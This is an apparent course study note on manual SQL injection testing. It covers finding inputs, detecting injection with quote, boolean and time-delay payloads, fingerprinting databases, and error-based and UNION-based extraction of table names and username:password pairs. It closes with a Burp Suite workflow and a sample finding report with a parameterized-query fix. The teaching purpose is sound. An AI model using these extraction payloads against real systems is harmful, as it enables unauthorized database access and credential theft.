---
tags: [vapt, sqli, intermediate, methodology]
difficulty: intermediate
module: "06 - SQL Injection"
topic: "06.22 Manual SQLi Testing Methodology"
---

# 06.22 — Manual SQLi Testing Methodology

## Why Manual Testing?

Automated tools like sqlmap miss many injection points:
- Second-order injection (stored payloads)
- Injections in unusual places (headers, XML, GraphQL)
- Logic errors that cause different behavior
- WAF-protected targets where automation is blocked
- Complex multi-step injection paths

Manual testing finds what scanners miss.

---

## Phase 1: Input Discovery

Before testing, map all user-controlled inputs:

```
INPUT CHECKLIST:
  URL:
    ✓ GET parameters (?id=1, ?name=test)
    ✓ Path segments (/user/1/profile)
    ✓ Fragment (#section1) — rare
  
  HTTP Body:
    ✓ POST form fields (username=, password=)
    ✓ JSON fields ({"id": 1})
    ✓ XML fields (<id>1</id>)
    ✓ Multipart form names/values
  
  HTTP Headers:
    ✓ Cookie values (session=, prefs=)
    ✓ User-Agent, Referer, X-Forwarded-For
    ✓ Custom headers (X-User-ID, X-API-Key)
    ✓ Authorization header values
  
  INDIRECT (second-order):
    ✓ Profile fields (username, bio, address)
    ✓ Saved search queries
    ✓ File names on upload
    ✓ Any data stored and later retrieved
```

---

## Phase 2: Detect Injection

Test each input systematically. Use Burp Suite Repeater for this.

### String Termination Test

```
GOAL: Cause a SQL syntax error

PAYLOAD: ' (single quote)
SEND:    ?id=1'
EXPECT:  500 Internal Server Error OR SQL error message

ERROR MESSAGES INDICATING SQLI:
  MySQL:     "You have an error in your SQL syntax"
  MSSQL:     "Unclosed quotation mark"
  PostgreSQL:"unterminated quoted string"
  Oracle:    "ORA-01756: quoted string not properly terminated"
  Generic:   "SQL syntax", "syntax error", "mysql_fetch"

IF NO ERROR → try: ?id=1" (double quote)
IF STILL NO ERROR → may be numeric context: try ?id=1 AND 1=1
```

### Boolean Differential Test

```bash
# NUMERIC CONTEXT:
?id=1 AND 1=1--   # TRUE  → normal response
?id=1 AND 1=2--   # FALSE → different response
# Different → CONFIRMED!

# STRING CONTEXT:
?search=test' AND '1'='1   # TRUE
?search=test' AND '1'='2   # FALSE
# Different → CONFIRMED!

# RESPONSE COMPARISON:
diff <(curl -s "URL_TRUE") <(curl -s "URL_FALSE")
# Any difference in size/content = injection!
```

### Time Delay Test

```bash
# WHEN BOOLEAN DIFFERENCE NOT VISIBLE:
?id=1 AND SLEEP(5)--         # MySQL
?id=1; WAITFOR DELAY '0:0:5'-- # MSSQL
'; SELECT pg_sleep(5)--       # PostgreSQL

# MEASURE RESPONSE TIME:
time curl -s "URL_WITH_PAYLOAD"
# Expected: ~5 seconds
```

---

## Phase 3: Determine Injection Context

Understanding context tells you which payloads to use:

```sql
-- NUMERIC:
SELECT * FROM items WHERE id = INPUT
                                ↑ no quotes around input
Tests: ?id=1 (works), ?id='1' (error), ?id=1 AND 1=1-- (works)

-- STRING (single-quoted):
SELECT * FROM items WHERE name = 'INPUT'
Tests: ?name=test' (error), ?name=test'-- (works)

-- STRING (double-quoted):
SELECT * FROM items WHERE name = "INPUT"
Tests: ?name=test" (error), ?name=test"-- (works)

-- INSIDE FUNCTION:
SELECT * FROM items WHERE name LIKE '%INPUT%'
Tests: ?q=test' (error), ?q=test%' -- (works)

-- ORDER BY:
SELECT * FROM items ORDER BY INPUT
Tests: ?sort=price-- (works), ?sort=SLEEP(5)-- (times out)

-- INSERT:
INSERT INTO logs (ip) VALUES ('INPUT')
Tests: ?ip=127.0.0.1' (error, but may only show in later query!)
```

---

## Phase 4: Fingerprint Database

```sql
-- MYSQL:
SLEEP(5)                → 5 second delay
version() = '8.%'       → MySQL version starts with 8
@@hostname              → MySQL-specific var
user()                  → MySQL-specific function

-- POSTGRESQL:
pg_sleep(5)             → PostgreSQL-specific
current_database()      → PostgreSQL-specific
CAST(version() AS INT)  → error reveals "PostgreSQL..."

-- MSSQL:
WAITFOR DELAY '0:0:5'   → MSSQL-specific
@@version = 'Microsoft%' → MSSQL
DB_NAME()               → MSSQL function

-- ORACLE:
dbms_pipe.receive_message('a',5) → Oracle-specific
FROM dual               → Oracle requires this
user (not user())       → Oracle uses user without ()

-- SQLITE:
sqlite_version()        → SQLite-specific
TYPEOF(1) = 'integer'   → SQLite type system

-- AUTOMATED FINGERPRINT:
-- Use ' AND 1=SLEEP(5)-- (MySQL responds, PostgreSQL doesn't)
-- Use CAST(1 AS INT) vs CONVERT(1, INT) syntax differences
```

---

## Phase 5: Exploitation Strategy

Choose your technique based on what information is visible:

```
DECISION TREE:
  
  Is there an error with DB info?
    YES → Error-based exploitation (fastest!)
    NO  ↓
  
  Is there output in the page?
    YES → UNION-based exploitation
    NO  ↓
  
  Is there a visible difference between true/false?
    YES → Boolean-based blind
    NO  ↓
  
  Is there a timing difference?
    YES → Time-based blind
    NO  ↓
  
  Can DB make outbound connections?
    YES → Out-of-band (DNS/HTTP)
    NO  ↓
  
  Is it a second-order stored injection?
    Need to trigger a separate action to see effect
```

---

## Phase 6: Data Extraction (Manual)

### Error-Based Extraction (MySQL)

```bash
# TEMPLATE:
PAYLOAD="' AND EXTRACTVALUE(1,CONCAT(0x7e,(SUBQUERY)))-- -"

# SUBQUERY = the data you want:
# Current DB:    (SELECT database())
# All tables:    (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database())
# Columns:       (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users')
# User data:     (SELECT CONCAT(username,':',password) FROM users LIMIT 1)
# All user data: (SELECT GROUP_CONCAT(username,':',password) FROM users)

# EXAMPLE:
curl "https://target.com/product?id=1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))-- -"
```

### UNION-Based Extraction (Manual Steps)

```bash
# STEP 1 — COLUMN COUNT:
?id=1 ORDER BY 1--  # no error
?id=1 ORDER BY 2--  # no error
?id=1 ORDER BY 3--  # error! → 2 columns

# STEP 2 — VISIBLE COLUMN:
?id=999 UNION SELECT 'mark1','mark2'--
# See which "mark" appears on page → that column is visible

# STEP 3 — VERSION:
?id=999 UNION SELECT NULL,version()--

# STEP 4 — TABLES:
?id=999 UNION SELECT NULL,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()--

# STEP 5 — COLUMNS:
?id=999 UNION SELECT NULL,GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'--

# STEP 6 — DATA:
?id=999 UNION SELECT NULL,GROUP_CONCAT(username,':',password) FROM users--
```

---

## Burp Suite Testing Workflow

```
1. PROXY:
   Set Burp as proxy → browse to target → Burp captures all requests

2. SPIDER / DISCOVER:
   Burp → Target → Site Map → Spider from here
   Lists all discovered URLs and params

3. REPEATER (manual testing):
   Right-click request → Send to Repeater
   Modify parameter → send → observe response
   Excellent for iterative payload testing

4. INTRUDER (automated fuzzing):
   Right-click → Send to Intruder
   Set injection point (§value§)
   Use Payload: Simple List → SQLi payloads wordlist
   Run attack → look for size/response differences

5. SCANNER (Pro only):
   Right-click → Scan → Active scan
   Burp Pro auto-detects SQLi

6. CUSTOM MARK INJECTION POINT:
   In Repeater: select value → right-click → Add to Intruder positions
   OR manually add § markers: ?id=§1§

7. EXTENSIONS (useful):
   SQLiPy: Burp + sqlmap integration
   Co2 (SQLMapper): another sqlmap bridge
```

---

## Reporting SQLi Findings

```markdown
TITLE: SQL Injection in /product (id parameter)

SEVERITY: Critical (CVSS 9.8)

DESCRIPTION:
  The 'id' parameter in GET /product?id=1 is vulnerable to 
  SQL injection. An attacker can extract all database contents,
  read server files, and potentially execute OS commands.

PROOF OF CONCEPT:
  1. Request:
     GET /product?id=1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))-- HTTP/1.1
     Host: target.com
     
  2. Response:
     XPATH syntax error: '~8.0.28-0ubuntu0.20.04.3'
     
  3. Database dump:
     GET /product?id=999 UNION SELECT NULL,GROUP_CONCAT(username,':',password) FROM users--
     → admin:5f4dcc3b5aa765d61d8327deb882cf99 (admin:password in MD5)

IMPACT:
  - Complete database compromise: credentials, PII, payment data
  - Authentication bypass possible via extracted credentials
  - Potential for OS command execution (MySQL FILE privilege)
  
REMEDIATION:
  Use parameterized queries (prepared statements):
  
  VULNERABLE:  $sql = "SELECT * FROM products WHERE id = " . $id;
  FIXED:       $stmt = $pdo->prepare("SELECT * FROM products WHERE id = ?");
               $stmt->execute([$id]);
```

---

## Related Notes
- [[01 - What is SQL Injection]] — SQLi fundamentals
- [[21 - sqlmap Full Usage Guide]] — automate the exploitation phase
- [[03 - Error-Based SQLi]] through [[07 - Out-of-Band SQLi]] — exploitation techniques
- [[Module 04 - VAPT Methodology]] — broader engagement methodology
